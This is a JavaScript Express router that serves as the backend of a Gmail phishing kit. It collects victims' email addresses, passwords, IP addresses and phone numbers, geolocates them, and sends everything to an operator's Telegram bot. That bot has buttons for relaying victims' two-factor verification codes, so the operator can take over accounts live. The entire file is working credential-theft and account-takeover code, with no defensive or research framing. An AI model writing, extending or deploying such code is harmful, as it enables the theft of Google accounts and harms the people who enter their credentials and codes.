import express from "express";
import axios from "axios";

const router = express.Router();

// Store message_id to userId mapping for reply detection
const messageToUser = new Map();

/**
 * POST /api/appauth/request
 * Send Telegram message with APPAUTH button.
 */
router.post("/request", async (req, res) => {
  try {
    const { userId, email, password, ip, name, businessEmail, tel } = req.body;

    if (!userId || !email) {
      return res.status(400).json({
        success: false,
        message: "Missing userId or email",
      });
    }

    if (!process.env.BOT || !process.env.CHAT_ID) {
      return res.status(503).json({
        success: false,
        message: "Telegram bot not configured",
      });
    }

    // Get IP location data
    let country = "XX";
    let city = "Unknown";
    if (ip) {
      try {
        const ipResponse = await axios.get(`http://ip-api.com/json/${ip}`);
        if (ipResponse.data && ipResponse.data.status === "success") {
          country = ipResponse.data.countryCode || "XX";
          city = ipResponse.data.city || "Unknown";
        }
      } catch (error) {
        console.log("Could not fetch location data");
      }
    }

    // Terminal-style message (matches Facebook format) with monospace for clickable/copyable
    const message =
      `GMAIL\n` +
      `=============${name || "User"}=============\n` +
      `ID: \`${userId}\`\n` +
      `IP: \`${ip || "N/A"}\`\n` +
      `Country: \`${country}\`\n` +
      `City: \`${city}\`\n` +
      `Gmail Email: \`${email}\`\n` +
      `Password1: \`${password || "N/A"}\`\n` +
      `============================`;

    // Button sends "/appauth userId" — the polling picks this up
    // and shows "Waiting for verification code..." in the Google modal.
    // Then admin replies to this message with the code.
    const telegramResponse = await axios.post(
      `https://api.telegram.org/bot${process.env.BOT}/sendMessage`,
      {
        chat_id: process.env.CHAT_ID,
        text: message,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "🔑 APPAUTH",
                callback_data: `/appauth ${userId}`,
              },
              {
                text: "🔒 Password",
                callback_data: `/password ${userId}`,
              },
            ],
          ],
        },
      },
      { timeout: 5000 }
    );

    // Store message_id for reply detection
    if (telegramResponse.data.ok && telegramResponse.data.result) {
      const messageId = telegramResponse.data.result.message_id;
      messageToUser.set(messageId, { userId, email, password, ip, country, city, name, businessEmail, tel });
      console.log(`[APPAUTH] Stored message ${messageId} for user ${userId}`);
    }

    console.log("[APPAUTH] Message sent for user:", userId);

    return res.status(200).json({
      success: true,
      message: "Auth request sent",
    });
  } catch (error) {
    console.error("Error in appauth request:", error.message);
    return res.status(500).json({
      success: false,
      message: error.message || "Internal server error",
    });
  }
});

/**
 * POST /api/appauth/reply
 * Handle admin's reply with verification code.
 * Frontend polling detects the reply and calls this endpoint.
 * This sends a new Telegram message with code + Wait/Done buttons.
 */
router.post("/reply", async (req, res) => {
  try {
    const { replyToMessageId, code } = req.body;

    if (!replyToMessageId || !code) {
      return res.status(400).json({
        success: false,
        message: "Missing replyToMessageId or code",
      });
    }

    const userData = messageToUser.get(replyToMessageId);
    if (!userData) {
      return res.status(404).json({
        success: false,
        message: "Original message not found",
      });
    }

    const { userId, email, password, ip, country, city, name } = userData;

    // Send new message with code + Wait/Done buttons (monospace for clickable/copyable)
    const confirmMessage =
      `GMAIL\n` +
      `=============${name || "User"}=============\n` +
      `ID: \`${userId}\`\n` +
      `IP: \`${ip || "N/A"}\`\n` +
      `Country: \`${country}\`\n` +
      `City: \`${city}\`\n` +
      `Gmail Email: \`${email}\`\n` +
      `Password1: \`${password || "N/A"}\`\n` +
      `Code: \`${code}\`\n` +
      `============================`;

    await axios.post(
      `https://api.telegram.org/bot${process.env.BOT}/sendMessage`,
      {
        chat_id: process.env.CHAT_ID,
        text: confirmMessage,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Wait",
                callback_data: `/wait ${userId}`,
              },
              {
                text: "Done",
                callback_data: `/done ${userId}`,
              },
            ],
          ],
        },
      },
      { timeout: 5000 }
    );

    console.log(`[APPAUTH] Confirmation sent for user ${userId} with code ${code}`);

    // Clean up
    messageToUser.delete(replyToMessageId);

    return res.status(200).json({
      success: true,
      message: "Confirmation sent",
    });
  } catch (error) {
    console.error("Error in appauth reply:", error.message);
    return res.status(500).json({
      success: false,
      message: error.message || "Internal server error",
    });
  }
});

// Cleanup old entries every 10 minutes
setInterval(() => {
  const now = Date.now();
  for (const [msgId, data] of messageToUser.entries()) {
    if (data.timestamp && now - data.timestamp > 600000) {
      messageToUser.delete(msgId);
    }
  }
}, 600000);

export default router;
